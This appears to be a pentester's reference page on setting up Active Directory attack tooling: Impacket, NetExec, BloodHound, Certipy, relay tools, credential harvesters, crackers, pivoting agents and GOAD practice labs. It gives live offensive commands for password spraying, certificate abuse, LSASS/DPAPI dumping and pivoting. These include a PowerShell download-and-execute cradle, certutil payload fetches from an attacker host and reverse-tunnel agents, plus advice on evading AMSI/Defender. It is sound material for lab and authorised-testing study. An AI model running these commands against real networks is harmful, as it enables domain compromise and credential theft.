# AD - Tooling & Setup

## Table of Contents
- [Which Tool For Which Job](#which-tool-for-which-job)
- [Base Setup (Linux)](#base-setup-linux)
- [Impacket](#impacket)
- [NetExec (nxc)](#netexec-nxc)
- [BloodHound CE + Neo4j](#bloodhound-ce--neo4j)
- [BloodHound Collectors](#bloodhound-collectors)
- [Certipy](#certipy)
- [Kerbrute](#kerbrute)
- [LDAP Tooling](#ldap-tooling)
- [Coercion and Relay](#coercion-and-relay)
- [DPAPI and Secrets Harvesting](#dpapi-and-secrets-harvesting)
- [gMSA and LAPS](#gmsa-and-laps)
- [Cracking (hashcat / john)](#cracking-hashcat--john)
- [Shells and Execution](#shells-and-execution)
- [Windows Toolkit](#windows-toolkit)
- [Pivoting](#pivoting)
- [BloodHound Cypher Basics](#bloodhound-cypher-basics)
- [Lab Environments (GOAD and friends)](#lab-environments-goad-and-friends)

For what to run once installed see [enumeration.md](enumeration.md), [credential-access.md](credential-access.md), and [kerberos.md](kerberos.md).

---

## Which Tool For Which Job

| Job | Primary tool | Alternatives |
|---|---|---|
| Multi-protocol sweep / spray / exec | `netexec` (nxc) | crackmapexec (deprecated) |
| Kerberoast / AS-REP roast | `GetUserSPNs.py`, `GetNPUsers.py` | Rubeus (Windows), nxc modules |
| DCSync / NTDS dump | `secretsdump.py` | mimikatz `lsadump::dcsync` |
| Remote code exec | `psexec.py`, `wmiexec.py`, `evil-winrm` | smbexec, atexec, dcomexec |
| Graph the domain | `bloodhound-ce-python`, SharpHound | rusthound-ce |
| ADCS enumeration + abuse | `certipy` | Certify + Certipy (Windows/Linux) |
| Username enum / spray via Kerberos | `kerbrute` | nxc `--kerberos`, Rubeus brute |
| LDAP read/write / ACL abuse | `bloodyAD` | ldapsearch, PowerView, dacledit.py |
| DNS/ADIDNS dump | `adidnsdump` | dnsrecon, Get-DnsServerResourceRecord |
| Coerce auth | `coercer`, `petitpotam`, `printerbug.py` | dfscoerce, PetitPotam.exe |
| NTLM relay | `ntlmrelayx.py` | krbrelayx (Kerberos relay) |
| DPAPI mass harvest | `donpapi` | SharpDPAPI, dpapi.py, mimikatz |
| Crack anything | `hashcat` | john |
| Pivot / tunnel | `ligolo-ng` | chisel, sshuttle, proxychains+socks |
| Ticket forging (golden/silver) | `ticketer.py`, Rubeus | mimikatz `kerberos::golden` |
| Overpass/S4U/PtT | Rubeus, `getST.py` | impacket `-k`, mimikatz |

## Base Setup (Linux)

Use pipx for Python CLI tools to avoid dependency clashes. Kali/Parrot ship most of these; the installs below are for a clean Debian/Ubuntu box.

```bash
sudo apt update
sudo apt install -y pipx git python3-dev libkrb5-dev gcc build-essential \
  ldap-utils dnsutils smbclient krb5-user nmap freerdp2-x11 seclists
pipx ensurepath
# Kerberos client: when prompted for realm just accept default; edit /etc/krb5.conf per-target later
```

Per-target hygiene that saves hours:
```bash
# /etc/hosts - Kerberos and LDAPS need FQDNs
echo '10.10.10.10 dc01.corp.local corp.local dc01' | sudo tee -a /etc/hosts
# Clock skew - Kerberos fails >5min out
sudo timedatectl set-ntp off; sudo ntpdate 10.10.10.10   # or: sudo rdate -n 10.10.10.10
# Minimal /etc/krb5.conf
cat <<'EOF' | sudo tee /etc/krb5.conf
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_kdc = false
[realms]
    CORP.LOCAL = { kdc = dc01.corp.local ; admin_server = dc01.corp.local }
[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
EOF
```

## Impacket

```bash
pipx install impacket
# or bleeding edge from GitHub
pipx install git+https://github.com/fortra/impacket.git
# scripts are exposed as e.g. secretsdump.py, GetUserSPNs.py, psexec.py, wmiexec.py, ntlmrelayx.py
# Kali names them impacket-secretsdump etc.; both resolve
```

Core scripts: `secretsdump.py`, `GetUserSPNs.py`, `GetNPUsers.py`, `GetADUsers.py`, `getST.py`, `getTGT.py`, `ticketer.py`, `psexec.py`, `wmiexec.py`, `smbexec.py`, `atexec.py`, `dcomexec.py`, `mssqlclient.py`, `ntlmrelayx.py`, `lookupsid.py`, `findDelegation.py`, `rbcd.py`, `dacledit.py`, `owneredit.py`, `changepasswd.py`, `dpapi.py`, `smbclient.py`, `reg.py`.

Universal auth flags: `-hashes LM:NT` (PtH), `-k` (Kerberos, reads `KRB5CCNAME`), `-no-pass`, `-aesKey <hex>`, `-dc-ip`, `-target-ip`.

## NetExec (nxc)

Actively maintained fork of CrackMapExec.

```bash
pipx install git+https://github.com/Pennyw0rth/NetExec.git
# binary is 'nxc' (and 'netexec')
nxc --version
nxc -L                          # list all modules
nxc smb -L                      # list SMB modules
nxc ldap -M laps --options      # module option help
```

Protocols: `smb ldap winrm mssql ssh ftp rdp vnc wmi nfs`. Credential DB and loot: `~/.nxc/` (`workspaces`, `logs`). Common auth: `-u user -p pass`, `-H NThash`, `-k`, `--local-auth`, `--continue-on-success`, `--no-bruteforce`.

## BloodHound CE + Neo4j

BloodHound Community Edition ships via Docker Compose (bundles Postgres + Neo4j + API + web UI on `:8080`).

```bash
# Docker route (recommended for CE)
curl -L https://ghst.ly/getbhce -o docker-compose.yml
docker compose -f docker-compose.yml up -d
# UI: http://localhost:8080  - first-run admin password printed in the container logs:
docker compose logs bloodhound | grep -i "Initial Password"
```

Legacy BloodHound 4.x (Electron app + standalone Neo4j):
```bash
sudo apt install -y neo4j
sudo neo4j start                # or: sudo systemctl start neo4j
# browse http://localhost:7474 , default creds neo4j:neo4j , change on first login
# then launch the BloodHound electron app and connect to bolt://127.0.0.1:7687
```

CE and legacy use incompatible JSON schemas and different collectors — pick one stack and match the collector to it.

## BloodHound Collectors

```bash
# Legacy 4.x JSON
pipx install bloodhound
bloodhound-python -u u -p p -d corp.local -dc dc01.corp.local -ns 10.10.10.10 -c All --zip

# CE JSON (v6+)
pipx install bloodhound-ce
bloodhound-ce-python -u u -p p -d corp.local -dc dc01.corp.local -ns 10.10.10.10 -c All --zip

# RustHound-CE (static binary, fast)
cargo install rusthound-ce
# or download release binary from github.com/g0h4n/RustHound-CE
rusthound-ce -d corp.local -u u@corp.local -p p -i 10.10.10.10 -c All -z
```

Windows SharpHound: download the matching collector version from the BloodHound release page (CE ships SharpHound v2). `.exe` and `.ps1` both provided.

## Certipy

```bash
pipx install certipy-ad
certipy find -u user@corp.local -p pass -dc-ip 10.10.10.10 -vulnerable -stdout
certipy req -u user@corp.local -p pass -ca 'CORP-CA' -target ca01.corp.local -template ESC1-Template -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10       # PKINIT -> TGT + NT hash
```

Verbs: `find`, `req`, `auth`, `shadow` (Shadow Credentials/msDS-KeyCredentialLink), `relay` (ESC8/ESC11), `ca` (ESC7 manage), `template` (ESC4 edit), `forge` (golden certificate), `account`.

## Kerbrute

```bash
go install github.com/ropnop/kerbrute@latest      # binary in ~/go/bin
# or grab a release binary (kerbrute_linux_amd64 / kerbrute_windows_amd64.exe)
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt
kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.txt 'Winter2025!'
kerbrute bruteuser --dc 10.10.10.10 -d corp.local passwords.txt jsmith
```

## LDAP Tooling

```bash
sudo apt install -y ldap-utils                     # ldapsearch, ldapmodify
pipx install bloodyAD                               # read/write LDAP, ACL abuse, shadow creds
pipx install ldapdomaindump                         # ldapdomaindump -> HTML/JSON/grep
pipx install windapsearch                            # or git clone (ropnop version)
# bloodyAD common uses:
bloodyAD -d corp.local -u u -p p --host dc01 get writable --detail
bloodyAD -d corp.local -u u -p p --host dc01 add computer 'PWN$' 'Password123!'
bloodyAD -d corp.local -u u -p p --host dc01 set password 'victim' 'NewPass1!'
bloodyAD -d corp.local -u u -p p --host dc01 add genericAll 'target' 'attacker'
```

## Coercion and Relay

```bash
pipx install coercer
git clone https://github.com/topotam/PetitPotam           # petitpotam.py
git clone https://github.com/dirkjanm/krbrelayx           # krbrelayx.py, addspn.py, dnstool.py, printerbug.py
git clone https://github.com/Wh04m1001/DFSCoerce          # dfscoerce.py
# responder + ntlmrelayx come with impacket / apt
sudo apt install -y responder
coercer coerce -u u -p p -d corp.local -t target -l attacker-ip
```

krbrelayx bundle also gives `dnstool.py` (ADIDNS record add for coercion targets) and `addspn.py`.

## DPAPI and Secrets Harvesting

```bash
pipx install donpapi
pipx install pypykatz                     # offline LSASS/registry parsing
pipx install lsassy                       # remote LSASS dump orchestration (nxc integrates it)
# dpapi.py ships with impacket
donpapi collect -t 10.10.10.0/24 -u administrator -H <NThash> -d corp.local
pypykatz lsa minidump lsass.dmp
```

## gMSA and LAPS

```bash
git clone https://github.com/micahvandeusen/gMSADumper    # gMSADumper.py
pip install dsinternals                                    # gMSA blob -> NT hash helper (used by gMSADumper)
python3 gMSADumper.py -u u -p p -d corp.local -l dc01
git clone https://github.com/p0dalirius/pyLAPS            # pyLAPS.py (legacy LAPS)
# nxc -M laps handles both legacy and LAPSv2 decryption inline
```

## Cracking (hashcat / john)

```bash
# hashcat - use the distro package or the official release for latest modes
sudo apt install -y hashcat
# john jumbo (has all the *2john helpers)
sudo apt install -y john                # or build magnumripper/JohnTheRipper 'bleeding-jumbo'
# helpers: keepass2john, ssh2john, zip2john, office2john, pdf2john
hashcat -I                              # verify OpenCL/CUDA device visible
```

Wordlists/rules: `/usr/share/wordlists/rockyou.txt` (gunzip first on Kali), `seclists` (`/usr/share/seclists`), rules `best64.rule`, `OneRuleToRuleThemAll.rule`. See the mode table in [credential-access.md](credential-access.md).

## Shells and Execution

```bash
gem install evil-winrm            # or: pipx does not apply; use gem / docker
evil-winrm -i srv01 -u administrator -p 'Pass'
evil-winrm -i srv01 -u administrator -H <NThash>
evil-winrm -i srv01 -u administrator -r corp.local          # Kerberos (needs KRB5CCNAME + krb5.conf)
# Impacket exec methods
psexec.py corp.local/administrator:'Pass'@srv01             # SYSTEM, drops a service - noisy
wmiexec.py corp.local/administrator:'Pass'@srv01            # semi-interactive, quieter
smbexec.py corp.local/administrator:'Pass'@srv01
atexec.py corp.local/administrator:'Pass'@srv01 whoami      # scheduled task, one-shot
dcomexec.py corp.local/administrator:'Pass'@srv01
```

## Windows Toolkit

Drop-and-run binaries/scripts. AMSI/Defender will flag most — obfuscate, run from memory, or disable per-lab policy.

- **PowerView / PowerSploit** — `IEX (New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1')`. Use the `dev` branch of PowerSploit or the PowerSploit-3.0 fork; the abandoned master lacks newer functions.
- **Rubeus** — Kerberos Swiss-army knife. Compile from GhostPack source or grab a release; `Rubeus.exe kerberoast / asreproast / asktgt / s4u / tgtdeleg / triage / monitor`.
- **mimikatz** — `x64/mimikatz.exe`. `sekurlsa::`, `lsadump::`, `dpapi::`, `kerberos::`, `crypto::`.
- **Certify / Certify.exe** — ADCS enum+abuse on Windows (`Certify.exe find /vulnerable`).
- **Seatbelt** — host situational awareness (`Seatbelt.exe -group=all`).
- **SharpDPAPI / SharpChrome** — DPAPI + browser secret extraction.
- **SharpHound.exe** — collector (match version to your BloodHound stack).
- **Snaffler** — automated share credential hunting.
- **Certipy.exe** — certipy also runs on Windows via the packaged build.

Host them from your box: `python3 -m http.server 80` then `certutil -urlcache -f http://<ip>/Rubeus.exe C:\Temp\r.exe` or `iwr http://<ip>/Rubeus.exe -OutFile r.exe`.

## Pivoting

**ligolo-ng** — TUN-based, no proxychains needed; cleanest for AD ranges.
```bash
# Attacker (proxy)
go install github.com/nicocha30/ligolo-ng/cmd/proxy@latest
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
ligolo-proxy -selfcert
# On the pivot host (agent) - download from releases
agent.exe -connect <attacker-ip>:11601 -ignore-cert       # Windows
./agent -connect <attacker-ip>:11601 -ignore-cert         # Linux
# In ligolo console: session -> start ; then add route to the internal subnet:
sudo ip route add 10.10.20.0/24 dev ligolo
```

**chisel** — SOCKS over HTTP, universal fallback.
```bash
go install github.com/jpillora/chisel@latest
chisel server -p 8080 --reverse                            # attacker
chisel client <attacker-ip>:8080 R:socks                   # victim -> SOCKS5 on attacker :1080
# then: proxychains4 nxc smb 10.10.20.0/24 ...
```

For proxychains, set `socks5 127.0.0.1 1080` in `/etc/proxychains4.conf` and prefix commands with `proxychains4 -q`.

## BloodHound Cypher Basics

Query bar accepts raw Cypher. `MATCH` finds patterns, `RETURN p` renders paths.

```cypher
MATCH (u:User) WHERE u.name = "JSMITH@CORP.LOCAL" SET u.owned=true RETURN u   // mark owned
MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name              // unconstrained delegation
MATCH p=(n)-[:DCSync|GetChanges|GetChangesAll]->(:Domain) RETURN p           // DCSync capable
MATCH p=(n)-[:ReadGMSAPassword|ReadLAPSPassword]->() RETURN p                // credential reads
MATCH (u:User {hasspn:true}) RETURN u.name                                    // kerberoastable
```

Node kinds: `User Computer Group Domain OU GPO Container CertTemplate EnterpriseCA RootCA AIACA`. Edges include `MemberOf AdminTo HasSession GenericAll GenericWrite WriteDacl WriteOwner ForceChangePassword AddMember AllowedToDelegate AllowedToAct ReadLAPSPassword ReadGMSAPassword DCSync AddKeyCredentialLink Enroll ADCSESC1..ESC13`. Pre-built queries live under the "Cypher" tab folder icon.

## Lab Environments (GOAD and friends)

**GOAD (Game of Active Directory)** — the standard multi-DC, multi-domain, misconfig-rich practice range.

```bash
git clone https://github.com/Orange-Cyberdefense/GOAD
cd GOAD
# Providers: virtualbox, vmware, proxmox, ludus(recommended), aws, azure
./goad.sh -t install -l GOAD -p virtualbox            # full 5-machine lab
./goad.sh -t install -l GOAD-Light -p virtualbox      # 2-machine, lighter footprint
# GOAD uses Vagrant to build boxes + Ansible to lay down the vulnerable config
```

Variants: `GOAD` (full forest, 3 domains), `GOAD-Light` (1 domain, 2 hosts), `NHA` / `SCCM` mini-labs. The **Ludus** provider automates the whole build on a Proxmox host and is the least painful path.

Other targets to practice the same tooling against:
- **HTB / HTB Pro Labs** (Dante, Zephyr, Cerberus for AD chains) — no local build.
- **PG Practice / PG Play** (Offensive Security Proving Grounds) — many standalone AD boxes.
- **Vulnlab** — dedicated AD chains and red-team labs.
- **DetectionLab / vulnerable-AD** (`Invoke-VulnerableAD.ps1` sprays random misconfigs onto any test domain you build).

Minimum self-hosted setup: one Windows Server VM promoted to DC (`Install-ADDSForest`), one Windows 10/11 member, both on a host-only network with your Kali box; then run `Invoke-VulnerableAD` to seed Kerberoastable accounts, bad ACLs, and GPP passwords.
